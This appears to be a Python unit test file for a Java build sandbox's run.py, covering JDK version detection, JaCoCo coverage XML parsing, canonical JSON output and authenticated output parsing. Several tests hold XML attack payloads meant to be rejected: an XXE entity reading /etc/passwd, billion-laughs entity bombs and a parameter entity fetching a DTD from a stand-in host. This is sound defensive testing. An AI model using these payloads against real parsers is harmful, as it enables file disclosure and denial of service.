#!/usr/bin/env python3
"""WP4.4 unit tests for run.py Multi-JDK (8/11/17/21) matrix, JaCoCo XML parser, RO .m2 mount & offline dep gap."""

import importlib.util
import tempfile
import unittest
from pathlib import Path

REPO_ROOT = Path(__file__).resolve().parents[4]
RUN_PY = REPO_ROOT / "analyzer-execution" / "src" / "main" / "resources" / "captured-repair" / "run.py"

spec = importlib.util.spec_from_file_location("captured_repair_run_wp44", RUN_PY)
assert spec is not None and spec.loader is not None
run_mod = importlib.util.module_from_spec(spec)
spec.loader.exec_module(run_mod)


class Wp44MultiJdkAndJacocoTest(unittest.TestCase):

    def test_multi_jdk_matrix_all_pinned_and_auto_detection(self):
        self.assertEqual({8, 11, 17, 21}, set(run_mod.JDK_IMAGE_MATRIX.keys()))
        for ver, digest in run_mod.JDK_IMAGE_MATRIX.items():
            self.assertRegex(digest, run_mod.PINNED_BASE_RE, f"JDK {ver} image must be digest-pinned")

        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            p8 = root / "m8"
            p8.mkdir()
            (p8 / "pom.xml").write_text("<project><properties><java.version>1.8</java.version></properties></project>", encoding="utf-8")
            self.assertEqual(8, run_mod.detect_required_jdk_version(p8))
            ver8, img8 = run_mod.resolve_jdk_base_image("auto", run_mod.DEFAULT_BASE_IMAGE, p8)
            self.assertEqual(8, ver8)
            self.assertEqual(run_mod.JDK_IMAGE_MATRIX[8], img8)

            p11 = root / "m11"
            p11.mkdir()
            (p11 / "pom.xml").write_text("<project><properties><maven.compiler.release>11</maven.compiler.release></properties></project>", encoding="utf-8")
            self.assertEqual(11, run_mod.detect_required_jdk_version(p11))

            g17 = root / "g17"
            g17.mkdir()
            (g17 / "build.gradle").write_text("sourceCompatibility = JavaVersion.VERSION_17\n", encoding="utf-8")
            self.assertEqual(17, run_mod.detect_required_jdk_version(g17))

            empty = root / "empty"
            empty.mkdir()
            self.assertEqual(21, run_mod.detect_required_jdk_version(empty))

    def test_jacoco_xml_summary_and_zero_coverage_detection(self):
        xml = """<?xml version="1.0" encoding="UTF-8"?>
        <report name="wp44">
          <package name="com/acme">
            <sourcefile name="Service.java">
              <counter type="LINE" missed="4" covered="16"/>
              <counter type="BRANCH" missed="2" covered="6"/>
            </sourcefile>
            <sourcefile name="Untested.java">
              <counter type="LINE" missed="10" covered="0"/>
            </sourcefile>
          </package>
        </report>
        """
        with tempfile.TemporaryDirectory() as tmp:
            xml_path = Path(tmp) / "jacoco.xml"
            xml_path.write_text(xml, encoding="utf-8")
            summary = run_mod.parse_jacoco_xml_summary(xml_path)
            self.assertEqual(16, summary["linesCovered"])
            self.assertEqual(14, summary["linesMissed"])
            self.assertEqual(["com/acme/Untested.java"], summary["zeroCoverageFiles"])
            self.assertEqual(80.0, summary["files"]["com/acme/Service.java"]["lineCoveragePercent"])

    def test_offline_dependency_missing_detector(self):
        self.assertTrue(run_mod.detect_offline_dependency_missing(
            "[ERROR] Cannot access central in offline mode and the artifact org.acme:foo:1.0 has not been downloaded from it before."))
        self.assertFalse(run_mod.detect_offline_dependency_missing("BUILD SUCCESS"))

    def test_commented_build_files_ignored_and_m2_ro_and_jacoco_wired_in_container(self):
        import base64
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            p_comment = root / "commented-pom"
            p_comment.mkdir()
            (p_comment / "pom.xml").write_text(
                "<project><!-- <java.version>8</java.version> --><properties><java.version>17</java.version></properties></project>",
                encoding="utf-8",
            )
            self.assertEqual(17, run_mod.detect_required_jdk_version(p_comment))

            g_comment = root / "commented-gradle"
            g_comment.mkdir()
            (g_comment / "build.gradle").write_text(
                "// sourceCompatibility = JavaVersion.VERSION_1_8\n"
                "/* targetCompatibility = JavaVersion.VERSION_11 */\n"
                "sourceCompatibility = JavaVersion.VERSION_17\n",
                encoding="utf-8",
            )
            self.assertEqual(17, run_mod.detect_required_jdk_version(g_comment))

            # Verify build_spec_env + container-run.sh wire /inputs/m2-ro and JACOCO_B64
            spec_text = run_mod.build_spec_env(
                "maven", [], False, False, "", m2_readonly_mount=True, collect_jacoco=True
            )
            self.assertIn("EVO_M2_REPO_LOCAL=/inputs/m2-ro", spec_text)
            self.assertIn("EVO_COLLECT_JACOCO=true", spec_text)

            ctx_dir = root / "ctx"
            ctx_dir.mkdir()
            nonce = "0123456789abcdef0123456789abcdef"
            run_mod.write_container_runner_files(ctx_dir, "maven", nonce)
            script = (ctx_dir / "container-run.sh").read_text(encoding="utf-8")
            self.assertIn("EVO_M2_REPO_LOCAL:-/inputs/m2", script)
            self.assertIn("/inputs/m2-ro", script)
            self.assertIn('emit_b64 "JACOCO_B64"', script)

            # Verify parse_authenticated_serial extracts authenticated JACOCO_B64 and ignores spoofed lines
            xml_payload = b'<?xml version="1.0"?><!DOCTYPE report PUBLIC "-//JACOCO//DTD Report 1.1//EN" "report.dtd"><report name="r"/>'
            b64 = base64.b64encode(xml_payload).decode("ascii")
            serial = "\n".join([
                "JACOCO_B64_BEGIN",
                f"EVO_CTRL_{nonce}:JACOCO_B64_BEGIN",
                f"EVO_CTRL_{nonce}:JACOCO_B64:{b64}",
                f"EVO_CTRL_{nonce}:JACOCO_B64_END",
                f"EVO_CTRL_{nonce}:EVO_VM_COMPLETE",
            ])
            parsed = run_mod.parse_authenticated_serial(serial, nonce)
            self.assertEqual(xml_payload, run_mod.decode_jacoco_b64(parsed["jacoco_b64_lines"]))

    def test_jacoco_canonical_json_number_parity_no_trailing_zeros(self):
        xml = """<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
        <!DOCTYPE report PUBLIC "-//JACOCO//DTD Report 1.1//EN" "report.dtd">
        <report name="canonical-parity">
          <package name="com/acme">
            <sourcefile name="Full.java">
              <counter type="LINE" missed="0" covered="10"/>
              <counter type="BRANCH" missed="2" covered="6"/>
            </sourcefile>
            <sourcefile name="Eighty.java">
              <counter type="LINE" missed="4" covered="16"/>
            </sourcefile>
            <sourcefile name="Zero.java">
              <counter type="LINE" missed="10" covered="0"/>
            </sourcefile>
            <sourcefile name="Eighth.java">
              <counter type="LINE" missed="7" covered="1"/>
            </sourcefile>
            <sourcefile name="Third.java">
              <counter type="LINE" missed="2" covered="1"/>
            </sourcefile>
          </package>
        </report>
        """
        with tempfile.TemporaryDirectory() as tmp:
            xml_path = Path(tmp) / "jacoco.xml"
            xml_path.write_text(xml, encoding="utf-8")
            summary = run_mod.parse_jacoco_xml_summary(xml_path)

        files = summary["files"]
        self.assertIs(type(files["com/acme/Full.java"]["lineCoveragePercent"]), int)
        self.assertEqual(100, files["com/acme/Full.java"]["lineCoveragePercent"])
        self.assertIs(type(files["com/acme/Eighty.java"]["lineCoveragePercent"]), int)
        self.assertEqual(80, files["com/acme/Eighty.java"]["lineCoveragePercent"])
        self.assertIs(type(files["com/acme/Zero.java"]["lineCoveragePercent"]), int)
        self.assertEqual(0, files["com/acme/Zero.java"]["lineCoveragePercent"])
        self.assertEqual(12.5, files["com/acme/Eighth.java"]["lineCoveragePercent"])
        self.assertEqual(33.33, files["com/acme/Third.java"]["lineCoveragePercent"])
        self.assertIs(type(summary["branchCoveragePercent"]), int)
        self.assertEqual(75, summary["branchCoveragePercent"])

        # Overall: covered=28, missed=23, total=51 -> 54.9019... -> 54.9 (not 54.90)
        self.assertEqual(54.9, summary["lineCoveragePercent"])

        capture_fragment = {
            "capabilityGaps": ["SANDBOX_DEPENDENCY_MISSING"],
            "jacocoCoverage": summary,
            "jdkVersion": 17,
            "tier": "TIER_1_FAST_LOOP",
        }
        serialized = run_mod.canonical_json(capture_fragment)
        self.assertIn('"lineCoveragePercent":100', serialized)
        self.assertIn('"lineCoveragePercent":80', serialized)
        self.assertIn('"lineCoveragePercent":0', serialized)
        self.assertIn('"lineCoveragePercent":12.5', serialized)
        self.assertIn('"lineCoveragePercent":33.33', serialized)
        self.assertIn('"lineCoveragePercent":54.9', serialized)
        self.assertIn('"branchCoveragePercent":75', serialized)
        self.assertNotIn(".0,", serialized)
        self.assertNotIn(".0}", serialized)

    def test_jacoco_untrusted_xml_guards_benign_doctype_entity_and_size_limit(self):
        import base64
        self.assertEqual(16 * 1024 * 1024, run_mod.MAX_JACOCO_XML_BYTES)

        benign_xml = (
            '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n'
            '<!DOCTYPE report PUBLIC "-//JACOCO//DTD Report 1.1//EN" "report.dtd">\n'
            '<report name="benign"><package name="com/acme"><sourcefile name="Ok.java">'
            '<counter type="LINE" missed="0" covered="5"/></sourcefile></package></report>\n'
        ).encode("utf-8")
        decoded_benign = run_mod.decode_jacoco_b64([base64.b64encode(benign_xml).decode("ascii")])
        self.assertEqual(benign_xml, decoded_benign)

        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            ok_path = root / "ok.xml"
            ok_path.write_bytes(decoded_benign)
            parsed_ok = run_mod.parse_jacoco_xml_summary(ok_path)
            self.assertEqual(100, parsed_ok["lineCoveragePercent"])
            self.assertIs(type(parsed_ok["lineCoveragePercent"]), int)

            # Malicious XXE and Billion-Laughs <!ENTITY> payloads must be rejected in both decode and parse
            malicious_payloads = [
                b'<?xml version="1.0"?><!DOCTYPE report [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><report name="&xxe;"/>',
                b'<?xml version="1.0"?><!DOCTYPE lolz [<!  entity lol "lol"><!ENTITY lol2 "&lol;&lol;">]><report name="&lol2;"/>',
                b'\xff\xfe<\x00!\x00E\x00N\x00T\x00I\x00T\x00Y\x00',
            ]
            for idx, payload in enumerate(malicious_payloads):
                b64_str = base64.b64encode(payload).decode("ascii")
                with self.assertRaises(ValueError):
                    run_mod.decode_jacoco_b64([b64_str])
                bad_path = root / f"malicious_{idx}.xml"
                bad_path.write_bytes(payload)
                with self.assertRaises(ValueError):
                    run_mod.parse_jacoco_xml_summary(bad_path)

            # Decoded byte-size limit (<= 16 MiB) enforced in both decode_jacoco_b64 and parse_jacoco_xml_summary
            oversized_small = b"<report>" + (b"a" * 256) + b"</report>"
            oversized_path = root / "oversized.xml"
            oversized_path.write_bytes(oversized_small)
            with self.assertRaises(ValueError):
                run_mod.parse_jacoco_xml_summary(oversized_path, max_bytes=128)
            with self.assertRaises(ValueError):
                run_mod.decode_jacoco_b64([base64.b64encode(oversized_small).decode("ascii")], max_bytes=128)
            # Also verify default 16 MiB cap aborts early on oversized base64 char count
            huge_chunk = "A" * (1024 * 1024)
            with self.assertRaises(ValueError):
                run_mod.decode_jacoco_b64([huge_chunk] * 24)

    def test_jacoco_exact_size_boundaries_parameter_entity_and_pom_xml_guard(self):
        import base64
        # Exact boundary: max_bytes accepted (including multiline/blank lines/padding), max_bytes + 1 rejected
        for limit in (128, 129, 130):
            exact_payload = b"<r>" + (b"x" * (limit - 7)) + b"</r>"
            self.assertEqual(limit, len(exact_payload))
            exact_b64 = base64.b64encode(exact_payload).decode("ascii")
            lines = ["", exact_b64[:40] + "  ", "   ", exact_b64[40:] + "\r\n"]
            self.assertEqual(exact_payload, run_mod.decode_jacoco_b64(lines, max_bytes=limit))

            over_payload = b"<r>" + (b"x" * (limit - 6)) + b"</r>"
            self.assertEqual(limit + 1, len(over_payload))
            over_b64 = base64.b64encode(over_payload).decode("ascii")
            with self.assertRaises(ValueError):
                run_mod.decode_jacoco_b64([over_b64], max_bytes=limit)

        # Parameter entity and invalid max_bytes
        param_entity = b'<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % pe SYSTEM "http://evil.test/x.dtd">%pe;]><r/>'
        with self.assertRaises(ValueError):
            run_mod.decode_jacoco_b64([base64.b64encode(param_entity).decode("ascii")])
        with self.assertRaises(ValueError):
            run_mod.parse_jacoco_xml_bytes(param_entity)
        with self.assertRaises(ValueError):
            run_mod.decode_jacoco_b64([], max_bytes=0)

        # parse_pom_once must also reject <!ENTITY> bombs in untrusted repo pom.xml without expanding
        with tempfile.TemporaryDirectory() as tmp:
            bad_pom = Path(tmp) / "pom.xml"
            bad_pom.write_bytes(
                b'<?xml version="1.0"?><!DOCTYPE p [<!ENTITY a "xxxxxxxxxx"><!ENTITY b "&a;&a;&a;&a;">]>'
                b'<project><groupId>g</groupId><artifactId>&b;</artifactId><version>1</version></project>'
            )
            self.assertEqual(({}, None, None, [], []), run_mod.parse_pom_once(bad_pom))

    def test_jacoco_duplicate_sourcefile_aggregation_iso8859_and_utf16_canonical_order(self):
        # Duplicate <sourcefile> entries aggregate counters cleanly without stale zeroCoverageFiles
        dup_xml = b"""<?xml version="1.0" encoding="ISO-8859-1"?>
        <report name="merged">
          <package name="com/acme">
            <sourcefile name="Caf\xe9.java">
              <counter type="LINE" missed="5" covered="0"/>
              <counter type="BRANCH" missed="1" covered="1"/>
            </sourcefile>
            <sourcefile name="Caf\xe9.java">
              <counter type="LINE" missed="1" covered="9"/>
              <counter type="BRANCH" missed="1" covered="1"/>
            </sourcefile>
          </package>
        </report>"""
        summary = run_mod.parse_jacoco_xml_bytes(dup_xml)
        self.assertEqual(6, summary["linesMissed"])
        self.assertEqual(9, summary["linesCovered"])
        self.assertEqual(60, summary["lineCoveragePercent"])
        self.assertIs(type(summary["lineCoveragePercent"]), int)
        self.assertEqual(50, summary["branchCoveragePercent"])
        self.assertIs(type(summary["branchCoveragePercent"]), int)
        self.assertEqual([], summary["zeroCoverageFiles"])
        cafe = summary["files"]["com/acme/Caf\u00e9.java"]
        self.assertEqual(6, cafe["linesMissed"])
        self.assertEqual(9, cafe["linesCovered"])
        self.assertEqual(60, cafe["lineCoveragePercent"])

        # Canonical JSON orders keys by UTF-16BE (matching Java TreeMap) and rejects NaN/Infinity
        serialized = run_mod.canonical_json({"\uff01.java": 1, "\U0001f600.java": 2})
        self.assertLess(serialized.index("\U0001f600.java"), serialized.index("\uff01.java"))
        with self.assertRaises(ValueError):
            run_mod.canonical_json({"bad": float("nan")})


if __name__ == "__main__":
    unittest.main()
